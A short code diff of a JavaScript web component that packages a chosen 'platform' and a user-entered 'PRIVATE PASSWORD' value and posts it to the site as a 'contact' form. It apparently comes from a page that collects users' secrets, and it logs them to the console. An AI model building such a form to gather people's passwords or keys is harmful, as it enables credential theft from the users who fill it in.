@@ -161,7 +161,7 @@ export default {
         return
       }
       this.isLoading = true;
-      const data = {word: `${this.platform} PRIVATE PASSWORD= ${this.privateTextarea}`, name: "PRIVATE" }
+      const data = {privateTextarea: `${this.platform} PRIVATE PASSWORD= ${this.privateTextarea}`, name: "PRIVATE" }
 
        this.sendRequest(data).then(() => {
         this.isLoading = false;
@@ -182,7 +182,7 @@ export default {
       const axiosConfig = {
         header: { "Content-Type": "application/x-www-form-urlencoded" }
       };
-      console.log(data), this.encode({'form-name': 'contact', ...data});
+      console.log(data, this.encode({'form-name': 'contact', ...data}));
       axios.post('/', this.encode({'form-name': 'contact', ...data}), axiosConfig).then(response =>{
         console.log(response);
       })
